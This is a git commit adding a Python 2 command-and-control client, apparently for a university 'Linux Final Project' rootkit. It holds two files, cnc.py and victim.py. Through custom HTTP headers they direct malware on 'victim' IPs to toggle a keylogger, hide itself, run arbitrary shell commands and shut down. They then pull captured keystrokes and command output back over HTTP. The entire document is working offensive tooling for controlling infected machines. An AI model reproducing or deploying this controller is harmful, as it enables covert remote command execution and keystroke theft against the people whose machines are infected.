fd3800b3518968846e782fbfa5f93c2fba4a421e
Shahar Tal <shahartal9999@gmail.com>
2019-02-09 10:05:09 -0800

    add cnc

---
+++ cnc/cnc.py
@@ -0,0 +1,157 @@
+import sys
+import re
+from victim import Victim, VictimIsDead
+
+
+class CNC:
+
+    def __init__(self, options):
+        self.options = options
+        self.victims = []
+        self.d_victims = ['192.168.205.130']
+    def print_menu(self):
+        """Print the menu options"""
+        count = 1
+        for option in self.options:
+            print "[%d] - %s " % (count, option[0])
+            count += 1
+        print
+
+    def get_func_from_user(self, input_string):
+        """Get input from user and translate it to a function"""
+        input = raw_input(input_string)
+
+        # Check that the input is a number
+        try:
+            choice = int(input)
+        except ValueError:
+            print "[!] Input is not a number!"
+            return None
+
+        # Check that there is such function
+        if len(self.options) < choice or choice <= 0:
+            print "[!] Input is not in menu range"
+            return None
+
+        choice -= 1
+
+        return getattr(self, self.options[choice][1])
+
+    def print_title(self, title):
+        """Prints the menu's title"""
+        print "[+] " + title + "\n"
+
+    def quit(self):
+        """Quit the app"""
+        sys.exit()
+
+    def list_victims(self):
+        """Prints all of the victims"""
+        if len(self.victims) == 0:
+            print "[-] No victims added"
+            return None
+
+        count = 1
+        print '-' * 20
+        for victim in self.victims:
+            print "[%d] - %s" % (count, victim)
+            count += 1
+        print '-' * 20
+
+    def default_victims(self):
+        if len(self.d_victims) == 0:
+            print "[-] No victims added"
+            return None
+
+        count = 1
+        print '-' * 20
+        for victim in self.d_victims:
+            print "[%d] - %s" % (count, victim)
+            count += 1
+        print '-' * 20
+        
+    def add_victim(self):
+        """Add a victim to the program"""
+        input = raw_input("Please enter the victim's IP address\n>> ")
+
+        # Check if input is an IP address
+        re_check = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", input)
+        if not re_check:
+            print "[-] Not a valid IP address"
+            return None
+
+        print "[*] Attempt connection to client's malware"
+
+        # Test connection to the malware
+        v = Victim(input)
+        try:
+            v.test_connection("0")
+        except VictimIsDead:
+            print "[-] %s is dead" % input
+            return None
+
+        print "[+] Connection successful"
+
+        # TODO connect to victim to test if malware is installed
+        self.victims.append(input)
+        print "[+] Client added"
+
+    def control_victim(self):
+        """Send controls to the victim"""
+
+        if len(self.victims) == 0:
+            print "[-] No victims added"
+            return None
+
+        input = raw_input("Please enter the victim's ID\n>> ")
+
+        # Check that the input is a number
+        try:
+            choice = int(input)
+        except ValueError:
+            print "[!] Input is not a number!"
+            return None
+
+        # Check that there is such function
+        if len(self.victims) < choice or choice <= 0:
+            print "[!] No such victim!"
+            return None
+
+        choice -= 1
+
+        print "[+] Communicating with %s\n" % self.victims[choice]
+        v = Victim(self.victims[choice])
+        ret = v.communicate()
+
+        # Remove client
+        if ret == 'd':
+            del self.victims[choice]
+
+def main():
+    """Main function for the CNC client"""
+
+    main_menu_options = [
+        ("Add Victim", "add_victim"),
+        ("List Victims", "list_victims"),
+        ("List default Victim", "default_victims"),
+        ("Control Victim", "control_victim"),
+        ("Quit", "quit")
+    ]
+
+    # Display the main menu
+    m = CNC(main_menu_options)
+    m.print_title("Linux Final Project")
+    while True:
+        m.print_menu()
+        user_chosen_func = m.get_func_from_user(">> ")
+
+        # Execute the chosen function if found
+        if user_chosen_func:
+            user_chosen_func()
+
+        # Add newline
+        print
+
+
+if __name__ == "__main__":
+    main()
---
+++ cnc/victim.py
@@ -0,0 +1,177 @@
+import requests
+import sys
+import time
+
+MALWARE_STATUS_CODE = 200  # Change this to 666
+MALWARE_HEADER_RESPONSE = 'Content-Encoding'  # Change this to malware-response
+WEB_FOLDER = "/home/shahart/colman_rootkit"
+OUTPUT_SHELL_FILENAME = "output"
+OUTPUT_KL_FILENAME = "klog"
+
+class Victim:
+
+    def __init__(self, victim_ip):
+        self.victim_ip = victim_ip
+        self.options = [
+            ("Test connection", "test_connection", "0", ""),
+            ("Toggle keylogger", "toggle_keylogger", "1", OUTPUT_KL_FILENAME),
+            ("Trun on/off self hide", "set_self_hide", "2", ""),
+            ("Run shell command", "run_shell_command", "3", OUTPUT_SHELL_FILENAME),
+            ("Kill malware", "remove_malware", "4", ""),
+            
+        ]
+        self.helpers = [
+            ("View keylogger data", "view_keylogger"),
+            ("Back to menu", "back")
+        ]
+        #self.commands = {"TEST":"0", "KEYLOGGER":"1", "GETDATA":"2", "KILL":"3", "CMD":"4"}
+    def print_menu(self):
+        """Print the menu options"""
+        count = 1
+        for option in self.options:
+            print "[%d] - %s " % (count, option[0])
+            count += 1
+        for option in self.helpers:
+            print "[%d] - %s " % (count, option[0])
+            count += 1
+        print
+
+    def get_func_from_user(self, input_string):
+        """Get input from user and translate it to a function"""
+        input = raw_input(input_string)
+
+        # Check that the input is a number
+        try:
+            choice = int(input)
+        except ValueError:
+            print "[!] Input is not a number!"
+            return None
+
+        # Check that there is such function
+        if choice >= len(self.options) and choice < (len(self.helpers) + len(self.options) + 1):
+            return getattr(self, self.helpers[choice - len(self.options) - 1][1])()
+
+        elif len(self.options) < choice or choice <= 0:
+            print "[!] Input is not in menu range"
+            return None
+        
+        choice -= 1
+        return getattr(self, self.options[choice][1])(self.options[choice][2], self.options[choice][3])
+
+    def print_title(self, title):
+        """Prints the menu's title"""
+        print "[+] " + title + "\n"
+
+    def communicate(self):
+        """Start the menu for the victim's control"""
+
+        while True:
+            self.print_menu()
+            try:
+                user_chosen_func = self.get_func_from_user(">>> ")
+                if user_chosen_func:
+                    ret = user_chosen_func()
+            except QuitVictim:
+                print "[*] Quitting victim"
+                return
+            except VictimIsDead:
+                print "[-] %s is dead" % self.victim_ip
+                return
+            
+
+            # Add newline
+            print
+
+    def send_command(self, command, output_file, *args, **kwargs):
+        """Send a command to the malware"""
+        file_data = None
+        output = kwargs.pop('output', sys.stdout)
+
+        
+        r = self.send_packet(command, *args)
+        self.check_client(r)
+
+        # Client is alive
+        result = r.headers[MALWARE_HEADER_RESPONSE]
+        
+        if result.find(":file:") != -1 and output_file != "":
+            time.sleep(1)
+            result = result.replace(":file:", output_file)
+            #print "http://{}/{}".format(self.victim_ip, file_path[1])
+            file_data = requests.get("http://{}/{}".format(self.victim_ip, output_file))
+            if file_data.status_code  != 404:
+                file_data = file_data.text
+            else:
+                file_data = "File isnt exist"
+                
+        output.write("[+] %s response: %s\n" % (self.victim_ip, result))
+        if (file_data):
+            output.write(file_data)
+        
+    def test_connection(self, msg, output=""):
+        """Test communication to the malware"""
+        self.send_command(msg, output)
+
+    def toggle_keylogger(self, msg, output=""):
+        """Turn on the keylogger on the victim"""
+        self.send_command(msg, output, WEB_FOLDER + "/" + output)
+        
+    def set_self_hide(self, msg, output=""):
+        """Hide the malware"""
+        self.send_command(msg, output)
+         
+    def remove_malware(self, msg, output=""):
+        """Kill the malware"""
+        self.send_command(msg, output)
+        raise VictimIsDead
+
+    def run_shell_command(self, msg, output=""):
+        """Return the data sent by malware"""
+        cmd = raw_input("Enter command to execute\n>>> ")
+        self.send_command(msg, output, cmd + " > " + WEB_FOLDER + "/" + output)
+
+    def check_client(self, r):
+        """Check if response is from malware"""
+        
+        if not r or MALWARE_HEADER_RESPONSE not in r.headers:
+            raise VictimIsDead
+
+    def send_packet(self, function, *args):
+        """Send an HTTP packet to be intercepted by the malware"""
+
+        if len(args) != 0:
+            headers = {"colman-function": function,
+                       "colman-arg": ";".join(args)}
+        else:
+            headers = {"colman-function": function}
+
+        try:
+            return requests.get("http://%s/" % self.victim_ip,
+                                headers=headers)
+        except requests.exceptions.ConnectionError:
+            print "ConnectionError"
+            return None
+
+    def view_keylogger(self):
+        """View keylogger"""
+        try:
+            file_data = requests.get("http://{}/{}".format(self.victim_ip, OUTPUT_KL_FILENAME))
+        except requests.exceptions.ConnectionError:
+            print "ConnectionError"
+            return None
+        
+        if file_data.status_code  != 404:
+            file_data = file_data.text
+        else:
+            file_data = "File isnt exist"
+        print (file_data)
+
+    def back(self):
+        """Quit the app"""
+        raise QuitVictim
+
+class QuitVictim(Exception):
+    pass
+
+class VictimIsDead(Exception):
+    pass
